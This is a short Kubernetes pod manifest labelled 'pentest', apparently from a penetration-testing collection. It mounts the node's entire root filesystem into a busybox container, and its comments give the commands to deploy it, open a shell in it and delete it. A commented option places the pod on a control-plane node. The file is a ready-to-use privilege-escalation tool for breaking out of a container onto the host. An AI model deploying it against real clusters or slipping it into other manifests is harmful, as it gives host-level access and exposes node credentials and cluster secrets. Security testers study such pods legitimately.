###########################################################
## Deploy: kubectl -n [namespace] apply -f hostpath-exec-pod.yaml 
## Access: kubectl -n [namespace] exec -it hostpath-exec-pod -- bash
## Remove: kubectl -n [namespace] delete hostpath-exec-pod
###########################################################
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-exec-pod
  labels:
    app: pentest
spec:
  containers:
  - name: hostpath-exec-pod
    image: busybox
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  
  volumes:
  - name: noderoot
    hostPath:
      path: /